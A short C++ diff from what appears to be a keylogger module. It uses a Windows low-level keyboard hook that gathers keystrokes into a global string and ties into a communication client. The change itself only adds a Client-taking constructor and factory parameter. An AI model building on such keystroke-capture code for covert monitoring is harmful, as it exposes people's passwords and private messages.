@@ -9,6 +9,8 @@
 
 static std::string g_keys;
 
+ModuleKeyboard::ModuleKeyboard(Client &client) : _client(client) {}
+
 LRESULT CALLBACK ModuleKeyboard::hookCallback(int nCode, WPARAM wParam, LPARAM lParam ) {
     char pressedKey;
     auto pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
@@ -59,9 +61,9 @@ void ModuleKeyboard::start(ModuleCommunication &com) {
     UnhookWindowsHookEx(hook);
 }
 
-boost::shared_ptr<ModuleKeyboard> ModuleKeyboard::create() {
+boost::shared_ptr<ModuleKeyboard> ModuleKeyboard::create(Client &client) {
     return boost::shared_ptr<ModuleKeyboard>(
-            new ModuleKeyboard()
+            new ModuleKeyboard(client)
     );
 }
 
